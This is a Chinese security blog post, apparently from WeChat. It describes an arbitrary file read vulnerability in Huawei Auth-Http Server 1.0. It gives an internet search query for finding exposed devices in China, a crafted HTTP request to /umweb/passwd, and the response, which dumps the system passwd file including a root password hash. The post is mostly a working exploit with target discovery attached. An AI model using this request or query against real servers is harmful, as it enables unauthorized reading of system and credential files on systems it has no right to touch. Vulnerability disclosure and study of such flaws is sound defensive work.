<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2eYaHA5D7M5BSE76x97ClQ)

**声明**

****************************该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。****************************

**漏洞描述**

****************************华为 Auth-Http Server 1.0 存在任意文件读取，攻击者可通过该漏洞读取任意文件。****************************

**********************************************************************************资产收集**********************************************************************************

```
server="Huawei Auth-Http Server 1.0" && country="CN"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j917gZicczUO7Ziad3duQv0iaMNjiaXwPvGawbNyyw09Mj8zl4V1QOngZdbdkRnwc7IibhrUrokibDHkI9LUw/640?wx_fmt=png&from=appmsg)

**漏洞复现**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j917gZicczUO7Ziad3duQv0iaMNjHo9t2z8dX0PMRqn7tOWiccl3L1SSmM4ePUbsCwv8qQO2heQ7l3BwxOg/640?wx_fmt=png&from=appmsg)

**********************构造请求包**********************

```
GET /umweb/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

```

********************************************返回包********************************************

```
HTTP/1.1 200 OK
Pragma: no-cache
Cache-Control: no-store
Connection: close
Server: Huawei Auth-Http Server 1.0
Content-Type: text/html; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 727
root:6UZSjeWUui3JQ:0:0:root:/root:/bin/sh
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j917gZicczUO7Ziad3duQv0iaMNjFFaicOEoKpXjnPn0TJd8gPv24BOhjoYUV4yxcpc9TnEh9E1Q9MsDy6A/640?wx_fmt=png&from=appmsg)